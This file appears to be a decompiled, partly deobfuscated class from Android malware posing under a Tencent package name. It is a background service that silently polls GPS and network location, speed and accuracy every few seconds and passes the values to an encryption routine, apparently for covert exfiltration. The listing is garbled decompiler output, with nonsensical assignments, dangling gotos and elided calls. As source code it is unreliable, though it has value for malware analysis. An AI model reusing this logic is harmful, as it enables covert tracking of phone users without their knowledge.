package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: TertiaryBackgroundService
 * Original: Lcom/tencent/tunesxconcerningn105;
 */
public class TertiaryBackgroundService extends Service {

    // === FIELDS ===
    public static LocationListener LL;
    public static LocationManager LM;
    public static double Longting;
    public static long d = 0L;
    public static float letliudid;
    public static float sp;
    static TertiaryBackgroundService st;
    public static long t = 5000L;
    public static double ʾʼʾʿˈᵔঙʿ$ʿʼ;
    private String[] vul;

    // === METHODS ===

    static void StaticInitializer() {
        return;
    }

    public void Constructor() {
        // new Service()
        return;
    }

    static void access$000(TertiaryBackgroundService param0, double param1, double param2, float param3) {
        TertiaryBackgroundService.s(...);
        return;
    }

    private void p() {
        v0 = new Intent();
        v1 = TertiaryBackgroundService.class;
        // new Intent(v2, v1)
        v2.stopService(v0);
        return;
    }

    private void ru() {
        v0 = "gps";
        v1 = "network";
        v2 = "location";
        v13.getSystemService("location");
        TertiaryBackgroundService.LM = "location";
        // new TertiaryBackgroundService$1(v13)
        TertiaryBackgroundService.LL = "location";
        v3 = "location".isProviderEnabled("network");
        v3 = TertiaryBackgroundService.LM;
        v3.isProviderEnabled("gps");
        if (v3 != null && v3 != 0) { // goto +9
        if ("location" != null && "location" != 0) { // goto +7
        v13.p();
        // goto (branch)
        if ("location" == null || "location" == 0) { // goto +59
        "gps".getLastKnownLocation("network");
        if ("gps" == null || "gps" == 0) { // goto +36
        "gps".getLongitude();
        TertiaryBackgroundService.Longting = "network";
        "gps".getLatitude();
        TertiaryBackgroundService.ʾʼʾʿˈᵔঙʿ$ʿʼ = "network";
        "gps".getAccuracy();
        TertiaryBackgroundService.letliudid = "network";
        v4 = "gps".getSpeed();
        TertiaryBackgroundService.sp = "gps";
        v4 = TertiaryBackgroundService.Longting;
        v6 = TertiaryBackgroundService.letliudid;
        TertiaryBackgroundService.s(...);
        v7 = TertiaryBackgroundService.LM;
        v8 = "network";
        v9 = TertiaryBackgroundService.t;
        v11 = (float) "gps";
        v12 = TertiaryBackgroundService.LL;
        LocationManager.requestLocationUpdates(...);
        // goto (branch)
        if (v3 == null || v3 == 0) { // goto +68
        "network".getLastKnownLocation("gps");
        if ("gps" == null || "gps" == 0) { // goto +36
        "gps".getLongitude();
        TertiaryBackgroundService.Longting = "network";
        "gps".getLatitude();
        TertiaryBackgroundService.ʾʼʾʿˈᵔঙʿ$ʿʼ = "network";
        "gps".getAccuracy();
        TertiaryBackgroundService.letliudid = "network";
        v4 = "gps".getSpeed();
        TertiaryBackgroundService.sp = "gps";
        v4 = TertiaryBackgroundService.Longting;
        v6 = TertiaryBackgroundService.letliudid;
        TertiaryBackgroundService.s(...);
        v7 = TertiaryBackgroundService.LM;
        v9 = TertiaryBackgroundService.t;
        v11 = (float) "gps";
        v12 = TertiaryBackgroundService.LL;
        LocationManager.requestLocationUpdates(...);
        // goto (branch)
        v0 = 0;
        TertiaryBackgroundService.Longting = 0;
        TertiaryBackgroundService.ʾʼʾʿˈᵔঙʿ$ʿʼ = 0;
        v13.p();
        return;
    }

    private void s(double param0, double param1, float param2) {
        v0 = TertiaryBackgroundService.sp;
        v0 = (int) v0;
        v1 = new StringBuilder();
        // new StringBuilder()
        v1.append(v3, v4);
        v3 = v2.vul;
        v4 = 0;
        v3 = v3[0];
        v1.append(v3);
        v1.append(v5, v6);
        v3 = v2.vul;
        v3 = v3[0];
        v1.append(v3);
        v1.append(v7);
        v3 = v2.vul;
        v3 = v3[0];
        v1.append(v3);
        v1.append(v0);
        v5 = v1.toString();
        v5 = 1;
        v3.getBytes();
        DataEncryptionEngine.agreeltimelybfacilitatez38(0, v3);
        return;
    }

    public IBinder onBind(Intent param0) {
        v1 = 0;
        return 0;
    }

    public void onDestroy() {
        v0 = 0;
        DataPackagingEngine.s_tunesxconcerningn103_f2 = 0;
        v0 = 0;
        TertiaryBackgroundService.st = 0;
        v1 = TertiaryBackgroundService.LL;
        0.removeUpdates(v1);
        v2.onDestroy();
        return;
    }

    public int onStartCommand(Intent param0, int param1, int param2) {
        v3 = InstalledAppsScanner.FTX2;
        if (v2 == null || v2 == 0) { // goto +34
        v2.hasExtra(v3);
        if (v4 == null || v4 == 0) { // goto +28
        v0 = v1.getApplicationContext();
        v0 = v4.getResources();
        v0 = 2131296274;
        v4 = v4.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = v4;
        v2 = v2.getStringArrayExtra(v3);
        v1.vul = v2;
        v1.ru();
        v2 = 1;
        return 1;
    }
}
